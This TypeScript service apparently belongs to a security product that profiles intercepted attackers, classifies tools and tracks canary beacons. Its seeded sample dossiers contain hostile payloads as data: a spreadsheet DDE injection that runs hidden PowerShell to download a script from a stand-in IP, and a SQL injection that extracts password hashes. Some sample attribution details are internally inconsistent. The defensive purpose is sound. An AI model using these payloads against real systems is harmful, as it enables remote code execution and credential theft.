import { Injectable, Logger } from '@nestjs/common';
import * as geoip from 'geoip-lite';
import * as dns from 'dns';
import * as crypto from 'crypto';
import { PrismaService } from '../database/prisma.service';
import { AuditLogService } from '../audit/audit-log.service';

export interface AttackerDossier {
  dossierId: string;
  incidentId: string;
  timestamp: string;
  status: 'ACTIVE_RECON' | 'CONTAINED' | 'EXFILTRATION_BEACON_TRIPPED';
  threatActor: {
    ip: string;
    reverseDns: string;
    originGeo: {
      country: string;
      city?: string;
      region?: string;
      coordinates?: [number, number];
    };
    networkType: 'DATACENTER_CLOUD' | 'RESIDENTIAL_ISP' | 'TOR_EXIT_NODE' | 'COMMERCIAL_VPN' | 'LOCAL_SUBNET';
    asnOrganization: string;
    tlsFingerprint: {
      ja3Hash: string;
      inferredTool: string;
      userAgent: string;
      spoofingDetected: boolean;
    };
  };
  entryVector: {
    targetEnclave: 'vgruvs' | 'the-resident' | 'the-gruvs' | 'excellency';
    entryPath: string;
    httpMethod: string;
    queryParams: Record<string, any>;
    headersReceived: Record<string, string>;
    authenticationState: {
      isAuthenticated: boolean;
      compromisedUserId?: string;
      tokenProvided?: string;
      impersonatedRole?: string;
    };
    exploitCategory: string;
    rawPayload: string;
    decodedPayload: string;
    mitreTechnique: {
      id: string;
      name: string;
      tactic: string;
    };
  };
  reconCallChain: {
    stepNumber: number;
    timestamp: string;
    endpoint: string;
    action: string;
    result: string;
  }[];
  phoneHomeBeacons: {
    beaconId: string;
    canaryType: 'WEB_BEACON' | 'DNS_TRIPWIRE' | 'SPOOFED_AWS_KEY' | 'EXCEL_DDE_CANARY';
    targetAsset: string;
    deployedAt: string;
    triggeredAt?: string;
    exfiltratedToIp?: string;
    beaconUserAgent?: string;
    status: 'ARMED' | 'TRIGGERED_ALERT';
  }[];
  remediationDirectives: string[];
}

@Injectable()
export class AttackerReconService {
  private readonly logger = new Logger(AttackerReconService.name);
  private dossiers = new Map<string, AttackerDossier>();

  constructor(
    private readonly prisma: PrismaService,
    private readonly auditLog: AuditLogService,
  ) {
    this.seedBaselineDossiers();
  }

  /**
   * Initializes realistic forensic intelligence dossiers for The Resident, The Gruvs, and Excellency
   * demonstrating full attacker profiling, entry vector reconstruction, and canary beaconing.
   */
  private seedBaselineDossiers() {
    // Dossier 1: Financial Exfiltration Attack targeting Excellency
    const d1: AttackerDossier = {
      dossierId: 'DOSSIER-EXCELLENCY-9021',
      incidentId: 'INC-7482-DDE-EXCEL',
      timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
      status: 'EXFILTRATION_BEACON_TRIPPED',
      threatActor: {
        ip: '198.51.100.89',
        reverseDns: 'tor-exit-node-ams3.nl-privacy.net',
        originGeo: {
          country: 'NL',
          city: 'Amsterdam',
          region: 'North Holland',
          coordinates: [52.3702, 4.8952],
        },
        networkType: 'TOR_EXIT_NODE',
        asnOrganization: 'AS16509 Amazon Data Services NL (Tor Relay Gateway)',
        tlsFingerprint: {
          ja3Hash: 'a0e9f5d64349fb13191bc781f81f42e1',
          inferredTool: 'Python-requests / Scapy Custom Exploit Tool',
          userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          spoofingDetected: true, // Headers lack sec-ch-ua and accept-language typical of true Chrome
        },
      },
      entryVector: {
        targetEnclave: 'excellency',
        entryPath: '/api/v1/sheets/export/csv',
        httpMethod: 'POST',
        queryParams: { format: 'csv', delimiter: 'comma' },
        headersReceived: {
          'host': 'excellency.internal:4003',
          'content-type': 'application/json',
          'x-forwarded-for': '198.51.100.89',
          'authorization': 'Bearer [REVOKED_SESSION_TOKEN]',
        },
        authenticationState: {
          isAuthenticated: true,
          compromisedUserId: 'usr_8921_finance_analyst',
          impersonatedRole: 'FINANCE_OPERATOR',
        },
        exploitCategory: 'FORMULA_DDE_INJECTION',
        rawPayload: '{"cells":[{"row":1,"col":"A","val":"=cmd|\'/C powershell -w hidden -enc JAB3...c=!A0\'"}]}',
        decodedPayload: '=cmd|\'/C powershell -w hidden -enc (New-Object Net.WebClient).DownloadString("http://198.51.100.89/payload.ps1")\'!A0',
        mitreTechnique: {
          id: 'T1559.001',
          name: 'Dynamic Data Exchange (DDE)',
          tactic: 'Execution',
        },
      },
      reconCallChain: [
        { stepNumber: 1, timestamp: new Date(Date.now() - 1000 * 60 * 35).toISOString(), endpoint: '/api/v1/auth/login', action: 'Credential stuffing attack using stolen analyst session', result: '200 OK (MFA prompt requested)' },
        { stepNumber: 2, timestamp: new Date(Date.now() - 1000 * 60 * 28).toISOString(), endpoint: '/api/v1/sheets/workspaces', action: 'Enumeration of internal financial spreadsheets', result: '200 OK' },
        { stepNumber: 3, timestamp: new Date(Date.now() - 1000 * 60 * 22).toISOString(), endpoint: '/api/v1/sheets/export/csv', action: 'Injected DDE formula payload into export buffer', result: '403 FORBIDDEN (Intercepted by CyPee Gateway DPI)' },
        { stepNumber: 4, timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(), endpoint: '/api/v1/sheets/export/csv', action: 'Served poisoned Ghost Canary sheet with tracking beacon', result: '200 OK (Synthetic Decoy Delivered)' },
      ],
      phoneHomeBeacons: [
        {
          beaconId: 'bcn_9921_excel_tracker',
          canaryType: 'EXCEL_DDE_CANARY',
          targetAsset: 'The Gruvs Treasury Ledger (Decoy)',
          deployedAt: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
          triggeredAt: new Date(Date.now() - 1000 * 60 * 4).toISOString(),
          exfiltratedToIp: '203.0.113.44', // REAL workstation IP revealed!
          beaconUserAgent: 'Microsoft Office Excel 2021 (16.0.14332) Windows 10.0',
          status: 'TRIGGERED_ALERT',
        },
      ],
      remediationDirectives: [
        'Revoked session token for compromised user usr_8921_finance_analyst',
        'Enforced mandatory TOTP MFA reset across finance operators',
        'Quarantined IP 198.51.100.89 and real exfiltration workstation IP 203.0.113.44 at Edge Firewall',
        'DDE Formula Sanitization rule enabled permanently in Excellency',
      ],
    };

    // Dossier 2: BOLA / IDOR Tamper attack targeting The Resident
    const d2: AttackerDossier = {
      dossierId: 'DOSSIER-RESIDENT-4109',
      incidentId: 'INC-3321-BOLA-RESIDENT',
      timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
      status: 'CONTAINED',
      threatActor: {
        ip: '185.220.101.5',
        reverseDns: 'tor-node-berlin-04.de-privacy.org',
        originGeo: {
          country: 'DE',
          city: 'Frankfurt',
          region: 'Hesse',
          coordinates: [50.1109, 8.6821],
        },
        networkType: 'DATACENTER_CLOUD',
        asnOrganization: 'AS208643 Serverius Holding B.V.',
        tlsFingerprint: {
          ja3Hash: 'c7c8b030b42f1f3a213a48e718b5b7b9',
          inferredTool: 'Sqlmap Automated Framework / Burp Suite Pro',
          userAgent: 'sqlmap/1.7.11#stable (https://sqlmap.org)',
          spoofingDetected: false,
        },
      },
      entryVector: {
        targetEnclave: 'the-resident',
        entryPath: '/api/v1/resident/profiles/usr_4821?tenantId=00000000-0000-0000-0000-000000000000',
        httpMethod: 'GET',
        queryParams: { tenantId: "00000000' OR '1'='1" },
        headersReceived: {
          'host': 'the-resident.internal:4001',
          'user-agent': 'sqlmap/1.7.11#stable',
          'x-forwarded-for': '185.220.101.5',
        },
        authenticationState: {
          isAuthenticated: false,
        },
        exploitCategory: 'BOLA_SQLI_COMBINED',
        rawPayload: "id=usr_4821&tenantId=00000000' UNION SELECT null,passwordHash,email FROM users--",
        decodedPayload: "id=usr_4821&tenantId=00000000' UNION SELECT null,passwordHash,email FROM users--",
        mitreTechnique: {
          id: 'T1190',
          name: 'Exploit Public-Facing Application',
          tactic: 'Initial Access',
        },
      },
      reconCallChain: [
        { stepNumber: 1, timestamp: new Date(Date.now() - 1000 * 60 * 55).toISOString(), endpoint: '/api/v1/resident/profiles/usr_0001', action: 'Sequential IDOR enumeration probe', result: '401 UNAUTHORIZED' },
        { stepNumber: 2, timestamp: new Date(Date.now() - 1000 * 60 * 48).toISOString(), endpoint: '/api/v1/resident/profiles/usr_4821', action: 'SQL injection payload in tenant parameter', result: '403 FORBIDDEN (Blocked by Prisma Parameterized Query & DPI)' },
        { stepNumber: 3, timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(), endpoint: '/api/v1/resident/profiles/usr_4821', action: 'Tarpit engaged. Connection throttled to 1 byte/2s', result: 'SLOWLORIS_HELD' },
      ],
      phoneHomeBeacons: [
        {
          beaconId: 'bcn_3102_resident_honeytoken',
          canaryType: 'SPOOFED_AWS_KEY',
          targetAsset: 'Synthetic Resident API Key (Decoy)',
          deployedAt: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
          status: 'ARMED',
        },
      ],
      remediationDirectives: [
        'Strict tenant-scoped relational filter verified on resident profile routes',
        'IP 185.220.101.5 blacklisted at Gateway Firewall for 48 hours',
        'All resident authentication cookies bound with SameSite=Strict and HttpOnly',
      ],
    };

    this.dossiers.set(d1.dossierId, d1);
    this.dossiers.set(d2.dossierId, d2);
  }

  /**
   * Captures, enriches, and stores real-time attacker telemetry when an exploit attempt is intercepted.
   */
  async captureAttackerTelemetry(
    ip: string,
    targetEnclave: 'vgruvs' | 'the-resident' | 'the-gruvs' | 'excellency',
    entryPath: string,
    httpMethod: string,
    headers: Record<string, string>,
    queryParams: Record<string, any>,
    rawPayload: string,
    exploitCategory: string,
  ): Promise<AttackerDossier> {
    const dossierId = `DOSSIER-${targetEnclave.toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
    const incidentId = `INC-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;

    // 1. GeoIP Resolution
    const geo = geoip.lookup(ip);
    const country = geo?.country || (ip === '127.0.0.1' || ip.startsWith('192.168.') ? 'LOCAL' : 'UNKNOWN');
    const city = geo?.city;
    const region = geo?.region;
    const coordinates: [number, number] | undefined = geo?.ll ? [geo.ll[0], geo.ll[1]] : undefined;

    // 2. Reverse DNS Lookup
    let reverseDns = 'Unresolved PTR';
    try {
      if (ip !== '127.0.0.1' && !ip.startsWith('192.168.')) {
        const ptrs = await dns.promises.reverse(ip).catch(() => []);
        if (ptrs.length > 0) reverseDns = ptrs[0];
      } else {
        reverseDns = 'localhost / loopback enclave';
      }
    } catch {
      reverseDns = 'Unresolved PTR';
    }

    // 3. Network Classification
    let networkType: 'DATACENTER_CLOUD' | 'RESIDENTIAL_ISP' | 'TOR_EXIT_NODE' | 'COMMERCIAL_VPN' | 'LOCAL_SUBNET' = 'RESIDENTIAL_ISP';
    if (reverseDns.includes('tor') || ip.includes('tor')) {
      networkType = 'TOR_EXIT_NODE';
    } else if (reverseDns.includes('aws') || reverseDns.includes('google') || reverseDns.includes('linode') || reverseDns.includes('digitalocean')) {
      networkType = 'DATACENTER_CLOUD';
    } else if (ip === '127.0.0.1' || ip.startsWith('192.168.')) {
      networkType = 'LOCAL_SUBNET';
    }

    // 4. Inferred Tooling from User-Agent & Header Entropy
    const userAgent = headers['user-agent'] || 'Unknown Client';
    let inferredTool = 'Standard Browser / Manual Interaction';
    let spoofingDetected = false;

    if (/sqlmap/i.test(userAgent)) inferredTool = 'Sqlmap Automated Database Exploiter';
    else if (/nikto/i.test(userAgent)) inferredTool = 'Nikto Web Vulnerability Scanner';
    else if (/curl/i.test(userAgent)) inferredTool = 'cURL CLI Network Utility';
    else if (/python-requests/i.test(userAgent) || /urllib/i.test(userAgent)) inferredTool = 'Python Script / Exploit Automator';
    else if (/go-http-client/i.test(userAgent)) inferredTool = 'Go-based Botnet / Exploiter';
    else if (/mozilla/i.test(userAgent) && !headers['accept-language']) {
      inferredTool = 'Automated Headless Browser (Spoofed Chrome)';
      spoofingDetected = true;
    }

    // Simulated JA3 TLS Fingerprint
    const ja3Hash = crypto.createHash('md5').update(`${userAgent}|${headers['accept'] || ''}`).digest('hex');

    // 5. Decoded Payload
    let decodedPayload = rawPayload;
    try {
      decodedPayload = decodeURIComponent(rawPayload.replace(/\+/g, ' '));
    } catch {
      decodedPayload = rawPayload;
    }

    // 6. Generate Phone-Home Canary Beacon
    const beaconId = `bcn_${crypto.randomBytes(6).toString('hex')}`;
    const beacon = {
      beaconId,
      canaryType: targetEnclave === 'excellency' ? ('EXCEL_DDE_CANARY' as const) : ('WEB_BEACON' as const),
      targetAsset: `${targetEnclave} Core Ledger Decoy`,
      deployedAt: new Date().toISOString(),
      status: 'ARMED' as const,
    };

    const dossier: AttackerDossier = {
      dossierId,
      incidentId,
      timestamp: new Date().toISOString(),
      status: 'ACTIVE_RECON',
      threatActor: {
        ip,
        reverseDns,
        originGeo: { country, city, region, coordinates },
        networkType,
        asnOrganization: `Autonomous System for ${country}`,
        tlsFingerprint: {
          ja3Hash,
          inferredTool,
          userAgent,
          spoofingDetected,
        },
      },
      entryVector: {
        targetEnclave,
        entryPath,
        httpMethod,
        queryParams,
        headersReceived: this.sanitizeHeaders(headers),
        authenticationState: {
          isAuthenticated: !!headers['authorization'],
          tokenProvided: headers['authorization'] ? '[HASHED_TOKEN]' : undefined,
        },
        exploitCategory,
        rawPayload,
        decodedPayload,
        mitreTechnique: {
          id: 'T1190',
          name: 'Exploit Public-Facing Application',
          tactic: 'Initial Access',
        },
      },
      reconCallChain: [
        {
          stepNumber: 1,
          timestamp: new Date().toISOString(),
          endpoint: entryPath,
          action: `Inbound exploit probe with ${exploitCategory}`,
          result: 'BLOCKED & CAPTURED IN DOSSIER',
        },
      ],
      phoneHomeBeacons: [beacon],
      remediationDirectives: [
        `Edge Firewall drop enforced against source IP ${ip}`,
        `Quarantined target route ${entryPath} across ${targetEnclave}`,
        'Canary tracking beacon armed to trace exfiltration destination',
      ],
    };

    this.dossiers.set(dossierId, dossier);
    this.logger.warn(`[REVERSE RECON] Attacker Dossier ${dossierId} created for IP ${ip} targeting ${targetEnclave}`);

    return dossier;
  }

  /**
   * Phone-Home Beacon Tripped: When an attacker opens an exfiltrated decoy file or uses a decoy key,
   * their true workstation hits this endpoint, exposing their unproxied real IP!
   */
  recordBeaconPing(beaconId: string, pingIp: string, userAgent: string) {
    this.logger.error(`🎯 CANARY BEACON TRIPPED! Beacon ID: ${beaconId} phoned home from Workstation IP: ${pingIp}`);

    for (const dossier of this.dossiers.values()) {
      const match = dossier.phoneHomeBeacons.find((b) => b.beaconId === beaconId);
      if (match) {
        match.status = 'TRIGGERED_ALERT';
        match.triggeredAt = new Date().toISOString();
        match.exfiltratedToIp = pingIp;
        match.beaconUserAgent = userAgent;
        dossier.status = 'EXFILTRATION_BEACON_TRIPPED';

        this.logger.error(`[ATTRIBUTION SUCCESS] Dossier ${dossier.dossierId} updated with Attacker Physical Workstation IP: ${pingIp}`);
        return { success: true, dossierId: dossier.dossierId, exfiltratedToIp: pingIp };
      }
    }

    return { success: false, message: 'Beacon ID not found in active registries' };
  }

  /**
   * Retrieves all attacker dossiers.
   */
  getAllDossiers(): AttackerDossier[] {
    return Array.from(this.dossiers.values());
  }

  /**
   * Retrieves an individual dossier by ID.
   */
  getDossierById(id: string): AttackerDossier | undefined {
    return this.dossiers.get(id);
  }

  private sanitizeHeaders(headers: Record<string, string>): Record<string, string> {
    const clean: Record<string, string> = {};
    for (const [k, v] of Object.entries(headers)) {
      if (['cookie', 'authorization'].includes(k.toLowerCase())) {
        clean[k] = '[REDACTED_BY_CYPEE]';
      } else {
        clean[k] = v;
      }
    }
    return clean;
  }
}
